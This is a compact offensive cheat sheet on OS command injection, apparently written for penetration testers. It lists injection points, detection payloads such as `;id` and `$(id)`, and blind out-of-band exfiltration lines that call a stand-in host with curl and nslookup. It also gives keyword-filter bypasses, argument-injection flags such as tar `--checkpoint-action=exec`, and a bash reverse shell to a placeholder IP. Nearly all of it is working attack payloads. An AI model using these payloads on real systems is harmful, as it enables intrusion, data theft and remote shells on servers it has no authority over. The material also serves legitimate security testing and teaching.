## OS Command Injection
Where: any param that reaches a shell — ping/nslookup/traceroute tools, file converters (imagemagick/ffmpeg/pandoc), pdf/thumbnail generators, backup/export features, git/svn wrappers, filename fields.
Detect: append separators `;` `|` `&&` `||` `%0a` (newline) and a benign marker: `;id`, `|whoami`, `$(id)`, `` `id` ``, `;sleep 5` (time-based when output is swallowed).
Separators / substitution: `;` `|` `&&` `||` newline `%0a`; command substitution `$(cmd)` and backticks `` `cmd` ``; args injection when quotes aren't escaped.
Blind (no output): time (`;sleep 5`), OOB DNS/HTTP exfil `;curl http://OOB/$(whoami)` or `;nslookup $(whoami).OOB`, redirect to a readable file `;id>/var/www/html/x`.
Filter bypass: no-space `{cat,/etc/passwd}` or `cat</etc/passwd` or `$IFS`; blocked keywords `who''ami`, `w\ho\am\i`, `$(rev<<<imaohw)`; globbing `/???/c?t /etc/passwd`; base64 `bash -c "$(echo aWQ=|base64 -d)"`.
Arg injection (no shell metachar): a value used as a CLI flag — `-o ProxyCommand`, imagemagick `-write`, `--output`, tar `--checkpoint-action=exec`.
Escalate: reverse shell (`bash -i >& /dev/tcp/IP/PORT 0>&1`), read secrets/env, pivot. This is direct RCE — top severity.
